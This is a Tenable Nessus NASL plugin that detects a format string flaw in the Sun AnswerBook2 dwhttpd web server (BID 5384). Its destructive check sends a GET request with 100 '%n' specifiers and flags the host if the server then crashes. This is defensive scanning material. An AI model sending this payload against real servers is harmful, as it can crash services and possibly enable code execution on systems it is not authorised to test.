#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added BugtraqID
#      This script could also cover BID:1556 and CVE-2000-0697
#
# *untested*
#
# References:
#
# Date:  Thu, 1 Aug 2002 16:31:40 -0600 (MDT)		      
# From: "ghandi" <ghandi@mindless.com>			      
# To: bugtraq@securityfocus.com				      
# Subject: Sun AnswerBook2 format string and other vulnerabilities
#
# Affected:
# dwhttp/4.0.2a7a, dwhttpd/4.1a6
# And others?


include("compat.inc");

if(description)
{
 script_id(11075);
 script_version ("$Revision: 1.22 $");
 script_bugtraq_id(5384);
 script_xref(name:"OSVDB", value:"56995");

 script_name(english:"Sun AnswerBook2 Web Server dwhttpd GET Request Remote Format String");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote web server is vulnerable to a format string attack.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system." );
 script_set_attribute(attribute:"solution", value:
"upgrade your software or protect it with a filtering reverse proxy" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 script_summary(english:"DynaWeb server vulnerable to format string");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_require_ports("Services/www", 8888);
 script_dependencie("find_service1.nasl", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function check(port)
{
 local_var	banner, i, r;

 banner = get_http_banner(port: port);
 if ( "dwhttp/" >!< banner ) return 0;

 if(http_is_dead(port: port)) { return(0); }

 i = string("/", crap(data:"%n", length: 100));
 r = http_send_recv3(method:"GET", port: port, item: i);
 if(http_is_dead(port: port, retry:2)) { security_hole(port); }
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8888);
foreach port (ports)
{
 check(port:port);
}
